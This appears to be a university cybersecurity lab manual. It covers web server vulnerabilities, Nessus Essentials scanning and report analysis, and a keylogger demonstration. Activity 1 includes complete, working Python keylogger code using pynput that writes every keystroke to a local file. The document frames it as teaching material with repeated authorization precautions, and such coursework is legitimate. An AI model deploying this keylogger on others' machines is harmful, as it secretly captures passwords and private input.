# Experiment 3
# Web Server Vulnerabilities and Exploitation: Python Keylogger Demonstration and Nessus Vulnerability Assessment

## Aim

To understand web server vulnerabilities, demonstrate the working of a basic Python keylogger in a controlled environment, and perform vulnerability assessment using Nessus Essentials.

---

## Course Outcome Mapping

**CO3:** Measure the performance and troubleshoot cyber security systems.

---

## Prerequisites

Students should be familiar with:

- Operating System Basics
- Computer Networks
- Python Programming
- Client-Server Architecture
- Web Servers
- Basic Cyber Security Concepts

---

# Theory

A web server provides services to clients over HTTP or HTTPS. Improper configuration, outdated software, weak authentication mechanisms, and unpatched vulnerabilities make web servers attractive targets for attackers.

Before exploitation, security professionals perform **Vulnerability Assessment** to identify security weaknesses without exploiting them.

This experiment introduces two important concepts:

- Educational demonstration of a Python Keylogger
- Vulnerability Assessment using Nessus Essentials

> **Important:** This experiment is intended **only for educational purposes** inside an authorized laboratory environment.

---

# Part A – Web Server Vulnerabilities

Common web server vulnerabilities include:

- Outdated Software
- Default Credentials
- Weak Password Policies
- Missing Security Updates
- Directory Listing Enabled
- Improper File Permissions
- SQL Injection
- Cross Site Scripting (XSS)
- Insecure HTTP Configuration

These vulnerabilities are identified during security assessments before deploying proper countermeasures.

---

# Part B – Keylogger

A keylogger is software that records keyboard input.

Attackers may misuse keyloggers to steal sensitive information. Ethical hackers and security professionals study their working to understand detection mechanisms and improve endpoint security.

Typical workflow:

```
Keyboard Input
       │
       ▼
Capture Keystrokes
       │
       ▼
Store in Log File
       │
       ▼
Security Analysis
```

---

# Part C – Nessus Vulnerability Assessment

Nessus Essentials is a vulnerability assessment tool used to identify security weaknesses in systems and networks.

It performs checks such as:

- Missing Security Updates
- Weak Configurations
- Open Ports
- Vulnerable Services
- SSL/TLS Issues
- Operating System Detection

Unlike penetration testing tools, Nessus identifies vulnerabilities without exploiting them.

---

# Practical Scenario

You are working as a Security Analyst.

The organization has requested you to:

- Demonstrate how a basic keylogger works in a controlled environment.
- Scan a laboratory system using Nessus.
- Analyze detected vulnerabilities.
- Recommend mitigation techniques.

---

# Software Requirements

| Tool | Purpose |
|------|---------|
| Python 3 | Keylogger Demonstration |
| pynput Library | Keyboard Event Capture |
| Nessus Essentials | Vulnerability Assessment |
| Windows / Linux VM | Target Machine |

---

# Procedure

## Activity 1 – Create a Simple Python Keylogger

### Tool Used

- Python 3
- pynput Library

### Install Required Package

```bash
pip install pynput
```

### Sample Program

```python
from pynput import keyboard

log_file = "keystrokes.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
```

### Steps

1. Save the program.
2. Execute the script.
3. Type sample text.
4. Press **Esc** to stop logging.
5. Open the generated `keystrokes.txt` file.

### Expected Output

Students should observe:

- Keystrokes captured.
- Log file created.
- Special keys recorded.

> **Note:** Run the program only on your own laboratory machine for educational purposes.

---

## Activity 2 – Install Nessus Essentials

### Steps

1. Download Nessus Essentials.
2. Install the software.
3. Register using an activation code.
4. Wait for plugin updates.
5. Open the Nessus web interface.

### Expected Output

Students should observe:

- Nessus Dashboard
- Available Scan Templates

---

## Activity 3 – Perform Basic Vulnerability Scan

### Tool Used

Nessus Essentials

### Steps

1. Create a **Basic Network Scan**.
2. Enter the target IP address.

Example:

```
192.168.1.10
```

3. Save the scan.
4. Start scanning.
5. Wait for completion.

### Expected Output

Students should observe:

- Target Host
- Open Ports
- Running Services
- Vulnerability Count

---

## Activity 4 – Analyze Scan Report

Open the completed scan report.

Observe:

- Critical Vulnerabilities
- High Severity Issues
- Medium Severity Issues
- Low Severity Issues
- Informational Findings

Record the following information.

| Severity | Count |
|----------|------|
| Critical | |
| High | |
| Medium | |
| Low | |
| Info | |

---

## Activity 5 – Study Recommended Solutions

For each detected vulnerability, observe:

- Description
- Risk Level
- CVE (if available)
- Recommended Fix

Prepare a summary of the mitigation techniques.

---

# Observation Table

| Activity | Tool Used | Observation |
|-----------|-----------|-------------|
| Keylogger Demonstration | Python | |
| Vulnerability Scan | Nessus | |
| Open Ports | Nessus | |
| Vulnerabilities Identified | Nessus | |
| Recommended Fixes | Nessus | |

---

# Summary Table

| Activity | Tool | Purpose |
|----------|------|---------|
| Keylogger Demonstration | Python | Understand keyboard event logging |
| Vulnerability Assessment | Nessus | Identify security weaknesses |
| Risk Analysis | Nessus | Classify vulnerabilities |
| Mitigation | Nessus Report | Recommend security improvements |

---

# Result

A basic Python keylogger was demonstrated in a controlled laboratory environment to understand how keyboard events can be captured. A vulnerability assessment was successfully performed using Nessus Essentials, and the identified vulnerabilities along with their recommended mitigation techniques were analyzed.

---

# Precautions

- Perform the experiment only in an authorized laboratory environment.
- Execute the keylogger only on your own laboratory machine.
- Never install or run keyloggers on systems without permission.
- Scan only authorized hosts using Nessus.
- Do not exploit detected vulnerabilities.
- Follow institutional ethical hacking policies.

---

# Viva Questions

1. What is a web server vulnerability?
2. What is vulnerability assessment?
3. Differentiate between vulnerability assessment and penetration testing.
4. What is a keylogger?
5. Why are keyloggers considered a security threat?
6. What is Nessus Essentials?
7. What are CVEs?
8. What is CVSS?
9. Explain different vulnerability severity levels.
10. Why should vulnerabilities be remediated based on risk?

---

# Conclusion

This experiment introduced students to common web server vulnerabilities and demonstrated the educational use of a simple Python keylogger to understand keyboard event logging. Students also performed vulnerability assessment using Nessus Essentials, analyzed security findings, and learned how vulnerability reports assist organizations in strengthening their security posture.